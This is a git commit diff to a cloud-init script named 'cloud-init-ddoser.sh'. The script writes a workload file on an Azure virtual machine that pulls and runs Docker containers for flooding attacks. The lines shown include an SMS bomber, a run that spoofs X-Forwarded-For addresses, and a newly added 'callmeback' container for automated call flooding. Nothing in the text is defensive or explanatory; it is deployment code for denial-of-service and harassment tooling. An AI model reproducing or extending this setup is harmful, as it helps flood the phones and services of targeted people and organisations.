954d6768a6b0c2a51fba08ebc09817cfeabe5467
Tom Fabler <imagination.fault@gmail.com>
2022-03-06 19:00:42 +0200

    running new cold-calling functionality in docker

--- include/cloud-init-ddoser.sh
+++ include/cloud-init-ddoser.sh
@@ -61,6 +61,7 @@ docker run --pull always \
         --random-xff-ip | tee -a $LOG_PATH
 
 docker run -d --rm --pull always imsamurai/ivi | tee -a $LOG_PATH
-docker run -d --rm --pull always geph/sms-bomber | tee -a $LOG_PATH' > /home/azureuser/test_workload.sh
+docker run -d --rm --pull always geph/sms-bomber | tee -a $LOG_PATH
+docker run -d --rm --pull always imsamurai/callmeback | tee -a $LOG_PATH' > /home/azureuser/test_workload.sh
 
 chmod +x /home/azureuser/test_workload.sh
